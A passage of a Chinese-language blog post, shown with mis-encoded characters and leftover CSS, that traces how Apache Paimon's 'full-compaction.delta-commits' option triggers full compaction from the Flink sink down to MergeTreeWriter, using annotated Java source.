ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ¬æ–‡é‡ç‚¹ä»‹ç»Paimonå‹ç¼©å‚æ•°<code>full-compaction.delta-commits</code>çš„æ•´ä½“è°ƒç”¨æµç¨‹ï¼Œæ¶‰åŠåˆ°CompactTaskçš„è¯¦æƒ…ï¼š<a href="https://juejin.cn/post/7577609608828239898" target="_blank" title="https://juejin.cn/post/7577609608828239898">Paimonæºç è§£è¯» -- Compaction-1.MergeTreeCompactTask</a></p>
<h2 data-id="heading-1">ä¸€.<code>full-compaction.delta-commits</code>Â å‚æ•°æºç åˆ†æ</h2>
<h3 data-id="heading-2">1ï¸.å‚æ•°å®šä¹‰ï¼ˆCoreOptionsï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ConfigOption&lt;Integer&gt; FULL_COMPACTION_DELTA_COMMITS =
    key(<span class="hljs-string">"full-compaction.delta-commits"</span>)
        .intType()
        .noDefaultValue()  <span class="hljs-comment">// æ²¡æœ‰é»˜è®¤å€¼</span>
        .withDescription(
            <span class="hljs-string">"Full compaction will be constantly triggered after delta commits."</span>);
</code></pre>
<p><strong>å…³é”®ä¿¡æ¯ï¼š</strong></p>
<ul>
<li><strong>å‚æ•°ç±»å‹</strong>ï¼š<code>Integer</code></li>
<li><strong>é»˜è®¤å€¼</strong>ï¼šæ— ï¼ˆ<code>noDefaultValue()</code>ï¼‰</li>
<li><strong>å«ä¹‰</strong>ï¼šç»è¿‡æŒ‡å®šæ•°é‡çš„ delta æäº¤åï¼Œè§¦å‘ä¸€æ¬¡å…¨é‡å‹ç¼©</li>
</ul>
<h3 data-id="heading-3">2.å…¥å£<code>FlinkSink.createWriteProvider()</code></h3>
<p>CASE-1: write-only = trueï¼Œåç»­èµ°ä¸“ç”¨å‹ç¼©ä»»åŠ¡<br/>
CASE-2: write-only = falseï¼Œèµ°è‡ªåŠ¨å‹ç¼©</p>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨ <code>full-compaction.delta-commits</code> å‚æ•°ï¼Œå…¶æ¬¡ä½¿ç”¨ <code>compaction.optimization-interval</code> å‚æ•°</strong></li>
</ol>
<blockquote>
<p>deltaCommitså‚æ•°å–å€¼</p>
<ul>
<li>ç­‰äºfull-compaction.delta-commits</li>
<li>ç­‰äº(compaction.optimization-interval / cpé—´éš”)å–æ•´</li>
</ul>
</blockquote>
<ol start="2">
<li>å…ˆåˆ¤æ–­æ˜¯å¦é…ç½®äº†<code>changelog-producer = full-compaction</code> æˆ– é…ç½®äº†ä»»æ„ä¸Šé¢ä¸¤ä¸ªå‚æ•°ï¼Œèµ°<code>GlobalFullCompactionSinkWrite</code></li>
<li>å†åˆ¤æ–­æ˜¯å¦é…ç½®äº†<code>force-lookup = true ä¸” lookup-wait = false</code>æ‰èµ°å¼‚æ­¥<code>AsyncLookupSinkWrite</code></li>
</ol>
<p>æœ€åå…œåº•<code>StoreSinkWriteImpl</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> StoreSinkWrite.Provider <span class="hljs-title function_">createWriteProvider</span><span class="hljs-params">(
        CheckpointConfig checkpointConfig, <span class="hljs-type">boolean</span> isStreaming, <span class="hljs-type">boolean</span> hasSinkMaterializer)</span> {
    <span class="hljs-type">SerializableRunnable</span> <span class="hljs-variable">assertNoSinkMaterializer</span> <span class="hljs-operator">=</span>
            () -&gt;
                    Preconditions.checkArgument(
                            !hasSinkMaterializer,
                            String.format(
                                    <span class="hljs-string">"Sink materializer must not be used with Paimon sink. "</span>
                                            + <span class="hljs-string">"Please set '%s' to '%s' in Flink's config."</span>,
                                    ExecutionConfigOptions.TABLE_EXEC_SINK_UPSERT_MATERIALIZE
                                            .key(),
                                    ExecutionConfigOptions.UpsertMaterialize.NONE.name()));

    <span class="hljs-type">Options</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> table.coreOptions().toConfiguration();
    <span class="hljs-type">ChangelogProducer</span> <span class="hljs-variable">changelogProducer</span> <span class="hljs-operator">=</span> table.coreOptions().changelogProducer();
    <span class="hljs-type">boolean</span> waitCompaction;
    <span class="hljs-type">CoreOptions</span> <span class="hljs-variable">coreOptions</span> <span class="hljs-operator">=</span> table.coreOptions();
    <span class="hljs-comment">// CASE-1: write-only = trueï¼Œåç»­èµ°ä¸“ç”¨å‹ç¼©ä»»åŠ¡</span>
    <span class="hljs-keyword">if</span> (coreOptions.writeOnly()) {
        waitCompaction = <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// CASE-2: write-only = falseï¼Œèµ°è‡ªåŠ¨å‹ç¼©</span>
    <span class="hljs-keyword">else</span> {
        waitCompaction = coreOptions.prepareCommitWaitCompaction();
        <span class="hljs-type">int</span> <span class="hljs-variable">deltaCommits</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
        <span class="hljs-comment">// ä¼˜å…ˆä½¿ç”¨ full-compaction.delta-commits å‚æ•°</span>
        <span class="hljs-keyword">if</span> (options.contains(FULL_COMPACTION_DELTA_COMMITS)) {
            deltaCommits = options.get(FULL_COMPACTION_DELTA_COMMITS);
        }
        <span class="hljs-comment">// å…¶æ¬¡ä½¿ç”¨ compaction.optimization-interval å‚æ•°</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.contains(CHANGELOG_PRODUCER_FULL_COMPACTION_TRIGGER_INTERVAL)) {
            <span class="hljs-type">long</span> <span class="hljs-variable">fullCompactionThresholdMs</span> <span class="hljs-operator">=</span>
                    options.get(CHANGELOG_PRODUCER_FULL_COMPACTION_TRIGGER_INTERVAL).toMillis();
            <span class="hljs-comment">// æ ¹æ® checkpoint é—´éš”å°†æ—¶é—´è½¬æ¢ä¸ºæäº¤æ¬¡æ•° = compaction.optimization-interval / cpé—´éš”</span>
            deltaCommits =
                    (<span class="hljs-type">int</span>)
                            (fullCompactionThresholdMs
                                    / checkpointConfig.getCheckpointInterval());
        }
        <span class="hljs-comment">// (1) è‹¥é…ç½®äº†changelog-producer = full-compaction æˆ– é…ç½®äº†ä¸Šé¢ä¸¤ä¸ªå‚æ•°ï¼Œèµ°GlobalFullCompactionSinkWrite</span>
        <span class="hljs-keyword">if</span> (changelogProducer == ChangelogProducer.FULL_COMPACTION || deltaCommits &gt;= <span class="hljs-number">0</span>) {
            <span class="hljs-type">int</span> <span class="hljs-variable">finalDeltaCommits</span> <span class="hljs-operator">=</span> Math.max(deltaCommits, <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> (table, commitUser, state, ioManager, memoryPool, metricGroup) -&gt; {
                assertNoSinkMaterializer.run();
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalFullCompactionSinkWrite</span>(
                        table,
                        commitUser,
                        state,
                        ioManager,
                        ignorePreviousFiles,
                        waitCompaction,
                        finalDeltaCommits, <span class="hljs-comment">// ä¼ é€’deltaCommitså‚æ•°</span>
                        isStreaming,
                        memoryPool,
                        metricGroup);
            };
        }
    }

    <span class="hljs-comment">// (2) è‹¥é…ç½®äº†force-lookup = true ä¸” lookup-wait = falseæ‰èµ°å¼‚æ­¥AsyncLookupSinkWrite</span>
    <span class="hljs-keyword">if</span> (coreOptions.needLookup() &amp;&amp; !coreOptions.prepareCommitWaitCompaction()) {
        <span class="hljs-keyword">return</span> (table, commitUser, state, ioManager, memoryPool, metricGroup) -&gt; {
            assertNoSinkMaterializer.run();
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncLookupSinkWrite</span>(
                    table,
                    commitUser,
                    state,
                    ioManager,
                    ignorePreviousFiles,
                    waitCompaction,
                    isStreaming,
                    memoryPool,
                    metricGroup);
        };
    }
    <span class="hljs-comment">// CASE-1æœ€åèµ°è¿™</span>
    <span class="hljs-keyword">return</span> (table, commitUser, state, ioManager, memoryPool, metricGroup) -&gt; {
        assertNoSinkMaterializer.run();
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StoreSinkWriteImpl</span>(
                table,
                commitUser,
                state,
                ioManager,
                ignorePreviousFiles,
                waitCompaction,
                isStreaming,
                memoryPool,
                metricGroup);
    };
}
</code></pre>
<h3 data-id="heading-4">3.<code>GlobalFullCompactionSinkWrite</code>æäº¤å…¨é‡å‹ç¼©ä»»åŠ¡</h3>
<p>è¯¥ç±»çš„ç»§æ‰¿å…³ç³»å¦‚ä¸‹
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbe14ae6414048e8bc9fc7f162c940ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZXhwZWN0N2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766217666&amp;x-signature=r2p9RKaFKZIQVpb33rKUWB%2F8FZA%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-5">(1) <code>prepareCommit()</code> -- æ¯æ¬¡cpéƒ½æ£€æŸ¥æ˜¯å¦éœ€è¦æäº¤å…¨é‡å‹ç¼©ä»»åŠ¡</h4>
<p>æ­¥éª¤å¦‚ä¸‹</p>
<ol>
<li>æ£€æŸ¥ä¹‹å‰æäº¤çš„å…¨é‡å‹ç¼©æ˜¯å¦æˆåŠŸ</li>
<li>æ”¶é›†å½“å‰cpé˜¶æ®µå‰æ‰€æœ‰å·²ç»å†™å…¥çš„buckets -- èµ‹å€¼ç»™writtenBuckets</li>
<li>åˆ¤æ–­æ˜¯å¦åº”è¯¥è§¦å‘å…¨é‡å‹ç¼©</li>
</ol>
<blockquote>
<p><strong>åˆ¤æ–­ä¾æ®</strong>: writtenBuckets ä¸ä¸ºç©ºï¼Œä¸”å½“å‰cpid % deltaCommits==0 æ—¶æäº¤è§¦å‘ä¸€æ¬¡å…¨é‡å‹ç¼©ï¼Œä¾‹å¦‚ï¼šdeltaCommits=5ï¼Œåˆ™åœ¨ checkpointId=5,10,15,20... æ—¶è§¦å‘</p>
</blockquote>
<ol start="4">
<li>éœ€è¦è§¦å‘å…¨é‡å‹ç¼©ï¼Œè°ƒ<code>submitFullCompaction()</code>å»æäº¤å…¨é‡å‹ç¼©ä»»åŠ¡</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> List&lt;Committable&gt; <span class="hljs-title function_">prepareCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> waitCompaction, <span class="hljs-type">long</span> checkpointId)</span>
        <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-comment">// 1.æ£€æŸ¥ä¹‹å‰æäº¤çš„å…¨é‡å‹ç¼©æ˜¯å¦æˆåŠŸ</span>
    checkuccessfulFullCompaction();

    <span class="hljs-comment">// 2.æ”¶é›†å½“å‰cpé˜¶æ®µå†™å…¥çš„buckets</span>
    <span class="hljs-keyword">if</span> (!currentWrittenBuckets.isEmpty()) {
        writtenBuckets
                .computeIfAbsent(checkpointId, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;())
                .addAll(currentWrittenBuckets);
        currentWrittenBuckets.clear();
    }

    <span class="hljs-keyword">if</span> (LOG.isDebugEnabled()) {
        <span class="hljs-keyword">for</span> (Map.Entry&lt;Long, Set&lt;Tuple2&lt;BinaryRow, Integer&gt;&gt;&gt; checkpointIdAndBuckets :
                writtenBuckets.entrySet()) {
            LOG.debug(
                    <span class="hljs-string">"Written buckets for checkpoint #{} are:"</span>, checkpointIdAndBuckets.getKey());
            <span class="hljs-keyword">for</span> (Tuple2&lt;BinaryRow, Integer&gt; bucket : checkpointIdAndBuckets.getValue()) {
                LOG.debug(<span class="hljs-string">"  * partition {}, bucket {}"</span>, bucket.f0, bucket.f1);
            }
        }
    }
    <span class="hljs-comment">// 3.åˆ¤æ–­æ˜¯å¦åº”è¯¥è§¦å‘å…¨é‡å‹ç¼©</span>
    <span class="hljs-comment">// åˆ¤æ–­ä¾æ®: å½“å‰writtenBucketsä¸ä¸ºnull ä¸” (checkpointId % deltaCommits == 0 || checkpointId == Long.MAX_VALUE)</span>
    <span class="hljs-comment">// isFullCompactedIdentifier()ä½œç”¨: æ¯éš” deltaCommits æ¬¡æäº¤è§¦å‘ä¸€æ¬¡å…¨é‡å‹ç¼©</span>
    <span class="hljs-comment">// ä¾‹å¦‚ï¼šdeltaCommits=5ï¼Œåˆ™åœ¨ checkpointId=5,10,15,20... æ—¶è§¦å‘</span>
    <span class="hljs-keyword">if</span> (!writtenBuckets.isEmpty() &amp;&amp; isFullCompactedIdentifier(checkpointId, deltaCommits)) {
        waitCompaction = <span class="hljs-literal">true</span>;
    }
    <span class="hljs-comment">// 4.è°ƒ`submitFullCompaction()`å»æäº¤å…¨é‡å‹ç¼©ä»»åŠ¡</span>
    <span class="hljs-keyword">if</span> (waitCompaction) {
        <span class="hljs-keyword">if</span> (LOG.isDebugEnabled()) {
            LOG.debug(<span class="hljs-string">"Submit full compaction for checkpoint #{}"</span>, checkpointId);
        }
        submitFullCompaction(checkpointId);
        commitIdentifiersToCheck.add(checkpointId);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.prepareCommit(waitCompaction, checkpointId);
}
</code></pre>
<h4 data-id="heading-6">(2) <code>submitFullCompaction()</code></h4>
<p>å®ƒå…¶å®è¿˜æ˜¯è°ƒçˆ¶ç±»<code>StoreSinkWriteImplçš„å±æ€§TableWriteImpl</code>å¯¹æ¯ä¸ªbucketæ¡¶æ‰§è¡Œå…¨é‡å‹ç¼©æ“ä½œ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitFullCompaction</span><span class="hljs-params">(<span class="hljs-type">long</span> currentCheckpointId)</span> {
    <span class="hljs-keyword">if</span> (LOG.isDebugEnabled()) {
        LOG.debug(<span class="hljs-string">"Submit full compaction for checkpoint #{}"</span>, currentCheckpointId);
    }
    <span class="hljs-comment">// compactedBucketså­˜å‚¨å½“æ¬¡å‹ç¼©ä»»åŠ¡è¦å‹ç¼©çš„bucketsæ˜¯å“ªäº›</span>
    Set&lt;Tuple2&lt;BinaryRow, Integer&gt;&gt; compactedBuckets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
    <span class="hljs-comment">// éå†æ‰€æœ‰å†å²å†™å…¥çš„ buckets</span>
    writtenBuckets.forEach(
            (checkpointId, buckets) -&gt; {
                <span class="hljs-keyword">for</span> (Tuple2&lt;BinaryRow, Integer&gt; bucket : buckets) {
                    <span class="hljs-keyword">if</span> (compactedBuckets.contains(bucket)) {
                        <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// é¿å…é‡å¤å‹ç¼©</span>
                    }
                    compactedBuckets.add(bucket);
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-comment">// è°ƒçˆ¶ç±»StoreSinkWriteImplçš„å±æ€§TableWriteImplå¯¹æ¯ä¸ªbucketæ¡¶æ‰§è¡Œå…¨é‡å‹ç¼©æ“ä½œ</span>
                        write.compact(bucket.f0, bucket.f1, <span class="hljs-literal">true</span>);<span class="hljs-comment">// trueè¡¨ç¤ºæ‰§è¡ŒfullCompaction</span>
                    } <span class="hljs-keyword">catch</span> (Exception e) {
                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
                    }
                }
            });
}
</code></pre>
<h3 data-id="heading-7">4.<code>TableWriteImpl.compact()</code></h3>
<p>ä½œç”¨ï¼šè°ƒ<code>FileStoreWriteçš„å®ç°ç±»çš„compact()</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(BinaryRow partition, <span class="hljs-type">int</span> bucket, <span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// è¿™é‡Œçš„writeæ˜¯FileStoreWriteçš„å®ç°ç±»ï¼Œå¦‚KeyValueFileStoreWrite</span>
    write.compact(partition, bucket, fullCompaction); 
}
</code></pre>
<h3 data-id="heading-8">5.<code>FileStoreWriteå®ç°ç±»çš„compact()</code></h3>
<p>è¿™æ˜¯ä¸ªæ¥å£ï¼Œå…¶å®ç°ç±»å¦‚ä¸‹
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd1e1efd28aa4629b9a4571c2b5bc969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZXhwZWN0N2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766217666&amp;x-signature=duDDhzxe%2Fr2y2xD%2Brp%2BE6ebgy9w%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸‹é¢çœ‹<code>AbstractFileStoreWriteå®ç°çš„comapct()</code>ï¼Œæ¶‰åŠKeyValueFileStoreWriteè¯¦æƒ…è¯·çœ‹<a href="https://juejin.cn/editor/drafts/7582872365522141222" target="_blank" title="https://juejin.cn/editor/drafts/7582872365522141222">Paimonæºç è§£è¯» -- KeyValueFileStoreWrite</a></p>
<p>æ­¥éª¤å¦‚ä¸‹:</p>
<ol>
<li>å…ˆè°ƒ<code>getWriterWrapper()</code>è·å–å¯¹åº”<code>partition-bucket</code>çš„<code>WriterContainer(å…¶å®å°±æ˜¯RecordWriteråŒ…è£…èµ·æ¥)</code></li>
<li>ç”¨å…¶çš„<code>RecordWriterå®ç°ç±»å¦‚MergeTreeWriterçš„compact()</code>è¿›è¡Œå‹ç¼©ï¼Œå¹¶ä¼ å…¥<code>fullCompaction</code>è¡¨ç¤ºæ˜¯å¦éœ€è¦å…¨é‡å‹ç¼©</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(BinaryRow partition, <span class="hljs-type">int</span> bucket, <span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// 1.å…ˆè°ƒgetWriterWrapper()è·å–å¯¹äºpartition-bucketçš„WriterContainer</span>
    <span class="hljs-comment">// 2.ç”¨å…¶ä¸­çš„MergeTreeWriterå®ç°ç±»çš„compactæ–¹æ³•è¿›è¡Œå‹ç¼©ï¼Œå¹¶ä¼ å…¥fullCompactionæ˜¯å¦éœ€è¦å…¨é‡å‹ç¼©</span>
    getWriterWrapper(partition, bucket).writer.compact(fullCompaction);
}

<span class="hljs-comment">// è°ƒç”¨çš„getWriterWrapper()</span>
<span class="hljs-keyword">protected</span> WriterContainer&lt;T&gt; <span class="hljs-title function_">getWriterWrapper</span><span class="hljs-params">(BinaryRow partition, <span class="hljs-type">int</span> bucket)</span> {
    <span class="hljs-comment">// 1.è·å–å½“å‰å¯¹åº”partitionçš„buckets</span>
    Map&lt;Integer, WriterContainer&lt;T&gt;&gt; buckets = writers.get(partition);
    <span class="hljs-keyword">if</span> (buckets == <span class="hljs-literal">null</span>) {
        buckets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        writers.put(partition.copy(), buckets);
    }
    <span class="hljs-comment">// 2.ä¸ºæ¯ä¸ªbucketåˆ›å»ºWriterContainerå¯¹è±¡(å…¶å®å°±æ˜¯RecordWriteråŒ…è£…èµ·æ¥)</span>
    <span class="hljs-keyword">return</span> buckets.computeIfAbsent(
            bucket, k -&gt; createWriterContainer(partition.copy(), bucket, ignorePreviousFiles));
}
</code></pre>
<h3 data-id="heading-9">6.<code>RecordWriterå®ç°ç±»çš„compact()</code></h3>
<p>è¿™æ˜¯ä¸ªæ¥å£ï¼Œå…¶å®ç°ç±»å¦‚ä¸‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e964e03ecf74e2ebf65cbe492a5ec82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZXhwZWN0N2c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766217666&amp;x-signature=gKMqooK9rSBVR9lJ8Bm%2BExHnLAA%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸‹é¢ä»¥<code>MergeTreeWriter</code>ä¸ºä¾‹</p>
<h4 data-id="heading-10">(1) <code>compact()</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">compact</span><span class="hljs-params">(<span class="hljs-type">boolean</span> fullCompaction)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// è°ƒflushWriteBuffer(true, fullCompaction)</span>
    flushWriteBuffer(<span class="hljs-literal">true</span>, fullCompaction);
}
</code></pre>
<h4 data-id="heading-11">(2) <code>flushWriteBuffer()</code> -- æ ¸å¿ƒæµç¨‹</h4>
<p>è¿™æ˜¯è§¦å‘å‹ç¼©çš„æ ¸å¿ƒæµç¨‹ï¼Œå…¶æ­¥éª¤å¦‚ä¸‹</p>
<ol>
<li>æ£€æŸ¥æ˜¯å¦éœ€è¦ç­‰å¾…æœ€è¿‘çš„å‹ç¼©</li>
</ol>
<blockquote>
<ul>
<li>å¦‚æœé…ç½®çš„æ˜¯write-only=trueï¼Œåˆ™ä¸éœ€è¦ç­‰å¾…ï¼›</li>
<li>å…¶ä»–æƒ…å†µï¼Œåˆ™è¿›ä¸€æ­¥åˆ¤æ–­ï¼Œå½“å‰levelsçš„Sorted Runæ–‡ä»¶æ•° &gt; num-sorted-run.stop-triggeræ¯”è¾ƒï¼Œåˆ™éœ€è¦ç­‰å¾…å‹ç¼©ï¼›å¦åˆ™ï¼Œä¸éœ€è¦</li>
</ul>
</blockquote>
<ol start="2">
<li>ç”¨<code>KeyValueFileWriterFactory</code>å»åˆ›å»ºçš„Writer(changelogã€Merge)</li>
<li>å°†<code>writeBuffer</code>ç¼“å†²åŒºçš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œç”¨åˆ›å»ºçš„writerå»å†™å…¥åˆ°L0å±‚</li>
<li>è°ƒ<code>writer.result()</code>æ”¶é›†å†™å…¥åçš„<code>DataFileMetaæ–‡ä»¶æ•°æ®</code>å¹¶å°†è¿™äº›æ–‡ä»¶æ·»åŠ åˆ° <code>CompactManagerå®ç°ç±»</code>ï¼Œä»¥ä¾¿åç»­å‹ç¼©æ‰§è¡Œ</li>
<li>è°ƒ<code>trySyncLatestCompaction(waitForLatestCompaction)</code>ç­‰å¾…ä¹‹å‰çš„å‹ç¼©ä»»åŠ¡å®Œæˆ</li>
<li>è°ƒ<code>CompactManagerå®ç°ç±»çš„triggerCompaction()</code>å»è§¦å‘æ–°å‹ç¼©ï¼Œæºå¸¦æ˜¯å¦å…¨é‡å‹ç¼©å‚æ•°ï¼Œè¯¦æƒ…è¯·çœ‹<a href="https://juejin.cn/editor/drafts/7582814236584181798" target="_blank" title="https://juejin.cn/editor/drafts/7582814236584181798">Paimonæºç è§£è¯» -- CompactManager</a></li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å‹ç¼©çš„æ ¸å¿ƒè§¦å‘ä»£ç ,compact()ä¸­è°ƒç”¨è¯¥æ–¹æ³•
 * <span class="hljs-doctag">@param</span> waitForLatestCompaction: æ˜¯å¦ç­‰å¾…æœ€è¿‘çš„å‹ç¼©å®Œæˆ
 * <span class="hljs-doctag">@param</span> forcedFullCompaction: æ˜¯å¦å…¨é‡å‹ç¼©
 * <span class="hljs-doctag">@throws</span> Exception
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flushWriteBuffer</span><span class="hljs-params">(<span class="hljs-type">boolean</span> waitForLatestCompaction, <span class="hljs-type">boolean</span> forcedFullCompaction)</span>
        <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-keyword">if</span> (writeBuffer.size() &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 1.æ£€æŸ¥æ˜¯å¦éœ€è¦ç­‰å¾…æœ€è¿‘çš„å‹ç¼©</span>
        <span class="hljs-comment">// å¦‚æœé…ç½®çš„æ˜¯write-only=trueï¼Œåˆ™ä¸éœ€è¦ç­‰å¾…ï¼›</span>
        <span class="hljs-comment">// å…¶ä»–æƒ…å†µï¼Œåˆ™è¿›ä¸€æ­¥åˆ¤æ–­ï¼Œå½“å‰levelsçš„Sorted Runæ–‡ä»¶æ•° &gt; num-sorted-run.stop-triggeræ¯”è¾ƒï¼Œåˆ™éœ€è¦ç­‰å¾…å‹ç¼©ï¼›å¦åˆ™ï¼Œä¸éœ€è¦</span>
        <span class="hljs-keyword">if</span> (compactManager.shouldWaitForLatestCompaction()) {
            waitForLatestCompaction = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-comment">// 2.ç”¨KeyValueFileWriterFactoryå»åˆ›å»ºçš„Writer</span>
        <span class="hljs-comment">// changelog-producer = input ä¸” å¹¶ä¸æ˜¯åªå†™å…¥+Iï¼Œåˆ™éœ€è¦changelogWriterå»ç”Ÿæˆchangelog</span>
        <span class="hljs-keyword">final</span> RollingFileWriter&lt;KeyValue, DataFileMeta&gt; changelogWriter =
                (changelogProducer == ChangelogProducer.INPUT &amp;&amp; !isInsertOnly)
                        ? writerFactory.createRollingChangelogFileWriter(<span class="hljs-number">0</span>)
                        : <span class="hljs-literal">null</span>;
        <span class="hljs-comment">// åˆ›å»ºdataWriterï¼Œä»¥ä¾¿å†™å…¥æ•°æ®</span>
        <span class="hljs-keyword">final</span> RollingFileWriter&lt;KeyValue, DataFileMeta&gt; dataWriter =
                writerFactory.createRollingMergeTreeFileWriter(<span class="hljs-number">0</span>, FileSource.APPEND);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3.å°†writeBufferç¼“å†²åŒºçš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œç”¨writerå»å†™å…¥åˆ°L0å±‚</span>
            writeBuffer.forEach(
                    keyComparator,
                    mergeFunction,
                    changelogWriter == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : changelogWriter::write,
                    dataWriter::write);
        } <span class="hljs-keyword">finally</span> {
            writeBuffer.clear();
            <span class="hljs-keyword">if</span> (changelogWriter != <span class="hljs-literal">null</span>) {
                changelogWriter.close();
            }
            dataWriter.close();
        }
        <span class="hljs-comment">// 4.æ”¶é›†å†™å…¥åçš„DataFileMetaæ–‡ä»¶æ•°æ®</span>
        List&lt;DataFileMeta&gt; dataMetas = dataWriter.result();
        <span class="hljs-keyword">if</span> (changelogWriter != <span class="hljs-literal">null</span>) {
            newFilesChangelog.addAll(changelogWriter.result());
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (changelogProducer == ChangelogProducer.INPUT &amp;&amp; isInsertOnly) {
            List&lt;DataFileMeta&gt; changelogMetas = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            <span class="hljs-keyword">for</span> (DataFileMeta dataMeta : dataMetas) {
                <span class="hljs-type">String</span> <span class="hljs-variable">newFileName</span> <span class="hljs-operator">=</span> writerFactory.newChangelogFileName(<span class="hljs-number">0</span>);
                <span class="hljs-type">DataFileMeta</span> <span class="hljs-variable">changelogMeta</span> <span class="hljs-operator">=</span> dataMeta.rename(newFileName);
                writerFactory.copyFile(dataMeta, changelogMeta);
                changelogMetas.add(changelogMeta);
            }
            newFilesChangelog.addAll(changelogMetas);
        }
        <span class="hljs-comment">// å°†æ–°æ–‡ä»¶æ·»åŠ åˆ° compactManager</span>
        <span class="hljs-keyword">for</span> (DataFileMeta dataMeta : dataMetas) {
            newFiles.add(dataMeta);
            compactManager.addNewFile(dataMeta);
        }
    }
    <span class="hljs-comment">// 5.ç­‰å¾…ä¹‹å‰çš„å‹ç¼©ä»»åŠ¡å®Œæˆ</span>
    trySyncLatestCompaction(waitForLatestCompaction);
